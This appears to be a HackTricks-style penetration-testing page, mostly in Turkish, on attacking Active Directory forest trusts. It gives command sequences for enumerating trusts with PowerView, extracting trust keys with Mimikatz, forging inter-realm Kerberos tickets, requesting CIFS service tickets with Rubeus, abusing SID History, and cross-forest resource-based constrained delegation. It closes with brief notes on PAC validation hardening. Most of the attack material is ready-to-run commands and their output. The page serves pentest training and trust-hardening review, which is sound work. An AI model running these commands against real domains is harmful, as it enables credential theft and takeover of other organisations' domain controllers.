# Harici Orman Etki Alanı - Tek Yön (Gelen) veya çift yönlü

{{#include ../../banners/hacktricks-training.md}}

Bu senaryoda harici bir etki alanı size güveniyor (veya her ikisi birbirine güveniyor), bu yüzden onun üzerinde bir tür erişim elde edebilirsiniz.

## Keşif

Her şeyden önce, **güven ilişkisini** **keşfetmeniz** gerekiyor:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` ile ekstra önkoşullar olmadan cross-forest istismar yollarının (RBCD, SIDHistory) muhtemelen çalışıp çalışmayacağını hızlıca görebilirsiniz.

Önceki taramada, kullanıcı **`crossuser`**'ın **`External Admins`** grubunun içinde olduğu ve bu grubun **harici domainin DC**'si içinde **Admin access**'e sahip olduğu tespit edildi.

## İlk Erişim

Eğer diğer domainde kullanıcınızın herhangi bir **special** erişimini bulamadıysanız, yine de AD Methodology'ye geri dönüp **privesc from an unprivileged user** denemeyi (örneğin kerberoasting gibi) deneyebilirsiniz:

**Powerview functions**'u `-Domain` parametresi ile **other domain**'i **enumerate** etmek için kullanabilirsiniz, örneğin:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Kimlik Taklidi

### Giriş Yapma

Harici etki alanına erişimi olan kullanıcıların kimlik bilgileriyle sıradan bir yöntem kullanarak şu kaynaklara erişebilmeniz gerekir:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

Ayrıca [**SID History**](sid-history-injection.md) bir forest trust üzerinden kötüye kullanılabilir.

Eğer bir kullanıcı **bir forest'tan diğerine** taşınmışsa ve **SID Filtering etkin değilse**, **diğer forest'tan bir SID eklemek** mümkün hale gelir; bu **SID**, **trust üzerinden** kimlik doğrulaması yaparken kullanıcının **token**'ına **eklenecektir**.

> [!WARNING]
> Hatırlatma olarak, imzalama anahtarını şu komutla alabilirsiniz
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Mevcut domain kullanıcısını **taklit eden bir TGT**'yi **güvenilen** anahtarla **imzalayabilirsiniz**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Kullanıcıyı tamamen taklit etme
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD — trusting forest'ta bir makine hesabını kontrol ettiğinizde (no SID filtering / selective auth)

Eğer yabancı principal (FSP) sizi trusting forest'ta bilgisayar nesneleri üzerinde yazma yetkisine sahip bir gruba yerleştiriyorsa (ör. `Account Operators`, custom provisioning group), o forest'taki bir hedef sunucuda **Resource-Based Constrained Delegation** yapılandırabilir ve oradaki herhangi bir kullanıcıyı taklit edebilirsiniz:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Bu yalnızca **SelectiveAuthentication devre dışı bırakıldığında** ve **SID filtering** kontrol eden SID'inizi kaldırmadığında çalışır. Bu, SIDHistory forging'den kaçınan hızlı bir lateral yoldur ve genellikle trust incelemelerinde gözden kaçırılır.

### PAC validation hardening

PAC signature validation updates for **CVE-2024-26248**/**CVE-2024-29056** add signing enforcement on inter-forest tickets. In **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths can still work on unpatched DCs. In **Enforcement mode**, unsigned or tampered PAC data crossing a forest trust is rejected unless you also hold the target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) can weaken this while they remain available.



## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
